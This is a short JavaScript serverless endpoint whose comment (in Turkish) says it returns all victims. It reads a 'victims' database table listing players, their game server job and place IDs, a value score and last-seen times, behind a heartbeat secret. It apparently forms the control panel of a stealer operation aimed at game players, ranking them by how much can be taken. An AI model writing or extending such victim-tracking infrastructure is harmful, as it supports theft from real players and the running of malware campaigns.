// api/status.js — tüm kurbanları döner
import { neon } from "@neondatabase/serverless";

const sql = neon(process.env.DATABASE_URL);
const SECRET = process.env.HEARTBEAT_SECRET || "";

export default async function handler(req, res) {
  if (req.method !== "GET") return res.status(405).end();

  const secret = req.headers["x-secret"] || req.query?.secret || "";
  if (SECRET && secret !== SECRET) return res.status(401).json({ error: "Unauthorized" });

  try {
    const rows = await sql`
      SELECT player, status, job_id, place_id, value, last_seen
      FROM victims
      ORDER BY value DESC, last_seen DESC
    `;
    return res.status(200).json({ victims: rows });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
}
